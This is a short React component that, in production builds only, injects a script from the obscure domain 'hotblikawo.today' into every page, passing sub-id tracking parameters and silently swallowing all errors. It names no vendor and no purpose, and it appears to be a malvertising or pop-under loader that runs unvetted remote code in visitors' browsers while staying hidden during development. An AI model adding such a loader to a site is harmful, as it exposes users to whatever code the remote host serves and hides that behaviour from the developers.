"use client";
import { useEffect } from "react";

export default function ThirdPartyScripts() {
  useEffect(() => {
    if (process.env.NODE_ENV !== "production") return;
    try {
      const s = document.createElement("script");
      s.src = "https://hotblikawo.today/process.js?id=1505874255&p1=sub1&p2=sub2&p3=sub3&p4=sub4";
      s.async = true;
      document.body.appendChild(s);
      return () => {
        try { document.body.removeChild(s); } catch {}
      };
    } catch {}
  }, []);

  return null;
}
